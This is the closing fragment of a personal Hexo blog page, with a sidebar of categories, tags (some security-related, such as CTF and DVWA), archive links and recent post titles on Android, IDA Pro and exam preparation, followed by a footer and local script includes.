  </nav>

</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CSharp/">CSharp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Cpp/">Cpp</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/DVWA/">DVWA</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Java/">Java</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/JavaScript/">JavaScript</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Linux/">Linux</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/MySQL/">MySQL</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web/">Web</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/python/">python</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/">区块链</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/">密码学</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/">数据结构</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%AE%97%E6%B3%95/">算法</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BB%8F%E9%AA%8C/">经验</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/">计算机网络</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/">计算机考研复试</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/APP-Inventor/" rel="tag">APP Inventor</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/C/" rel="tag">C++</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CSharp/" rel="tag">CSharp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/" rel="tag">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Java/" rel="tag">Java</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JavaScript/" rel="tag">JavaScript</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Misc/" rel="tag">Misc</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/MySQL/" rel="tag">MySQL</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Reverse/" rel="tag">Reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6/" rel="tag">信息安全数学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" rel="tag">区块链</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8D%8F%E8%AE%AE/" rel="tag">协议</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" rel="tag">密码学</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" rel="tag">库与模块</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" rel="tag">拒绝服务攻击</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%99%E6%9D%90%E7%AD%94%E6%A1%88/" rel="tag">教材答案</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" rel="tag">数据结构</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" rel="tag">牛客网</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%AE%97%E6%B3%95/" rel="tag">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BB%8F%E9%AA%8C/" rel="tag">经验</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" rel="tag">计算机网络</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/" rel="tag">计算机考研复试</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/APP-Inventor/" style="font-size: 10.83px;">APP Inventor</a> <a href="/tags/Android/" style="font-size: 13.33px;">Android</a> <a href="/tags/C/" style="font-size: 16.67px;">C</a> <a href="/tags/C/" style="font-size: 20px;">C++</a> <a href="/tags/CSharp/" style="font-size: 10px;">CSharp</a> <a href="/tags/CTF/" style="font-size: 19.17px;">CTF</a> <a href="/tags/DVWA/" style="font-size: 12.5px;">DVWA</a> <a href="/tags/Java/" style="font-size: 10px;">Java</a> <a href="/tags/JavaScript/" style="font-size: 14.17px;">JavaScript</a> <a href="/tags/Linux/" style="font-size: 10px;">Linux</a> <a href="/tags/Misc/" style="font-size: 10px;">Misc</a> <a href="/tags/MySQL/" style="font-size: 10.83px;">MySQL</a> <a href="/tags/Reverse/" style="font-size: 11.67px;">Reverse</a> <a href="/tags/Web/" style="font-size: 17.5px;">Web</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/web/" style="font-size: 10px;">web</a> <a href="/tags/writeup/" style="font-size: 18.33px;">writeup</a> <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6/" style="font-size: 10.83px;">信息安全数学</a> <a href="/tags/%E5%89%8D%E7%AB%AF/" style="font-size: 14.17px;">前端</a> <a href="/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/" style="font-size: 10px;">区块链</a> <a href="/tags/%E5%8D%8F%E8%AE%AE/" style="font-size: 10.83px;">协议</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15.83px;">密码学</a> <a href="/tags/%E5%BA%93%E4%B8%8E%E6%A8%A1%E5%9D%97/" style="font-size: 13.33px;">库与模块</a> <a href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/" style="font-size: 10.83px;">拒绝服务攻击</a> <a href="/tags/%E6%95%99%E6%9D%90%E7%AD%94%E6%A1%88/" style="font-size: 10px;">教材答案</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/" style="font-size: 15px;">数据结构</a> <a href="/tags/%E7%89%9B%E5%AE%A2%E7%BD%91/" style="font-size: 15px;">牛客网</a> <a href="/tags/%E7%AE%97%E6%B3%95/" style="font-size: 17.5px;">算法</a> <a href="/tags/%E7%BB%8F%E9%AA%8C/" style="font-size: 16.67px;">经验</a> <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" style="font-size: 15.83px;">网络安全</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/" style="font-size: 10.83px;">计算机网络</a> <a href="/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E8%80%83%E7%A0%94%E5%A4%8D%E8%AF%95/" style="font-size: 15.83px;">计算机考研复试</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">九月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">六月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">十二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">五月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/04/">四月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/02/">二月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/01/">一月 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/12/">十二月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/11/">十一月 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">十月 2019</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2021/09/21/IDA%20Pro%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90dex%E6%96%87%E4%BB%B6/">IDA Pro静态分析dex文件</a>
          </li>
        
          <li>
            <a href="/2021/09/13/%E7%BC%96%E5%86%99%E5%B9%B6%E5%88%86%E6%9E%90%E7%AC%AC%E4%B8%80%E4%B8%AAAndroid%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F/">编写并分析第一个Android应用程序</a>
          </li>
        
          <li>
            <a href="/2021/09/05/Android%E5%9B%9B%E5%A4%A7%E7%BB%84%E4%BB%B6/">Android四大组件</a>
          </li>
        
          <li>
            <a href="/2021/06/25/%E4%B8%AD%E5%9B%BD%E7%9F%BF%E4%B8%9A%E5%A4%A7%E5%AD%A6%E6%9C%AC%E7%A7%91%E7%94%9F%E6%B6%AF%E6%80%BB%E7%BB%93/">中国矿业大学本科生涯总结</a>
          </li>
        
          <li>
            <a href="/2021/03/19/%E5%8C%97%E4%BA%AC%E5%B7%A5%E4%B8%9A%E5%A4%A7%E5%AD%A6%E8%80%83%E7%A0%94--%E5%A4%8D%E8%AF%95--%E6%9C%BA%E8%AF%95%E5%88%B7%E9%A2%98/">北京工业大学考研--复试--机试刷题</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2022 iHui<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.4.1.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>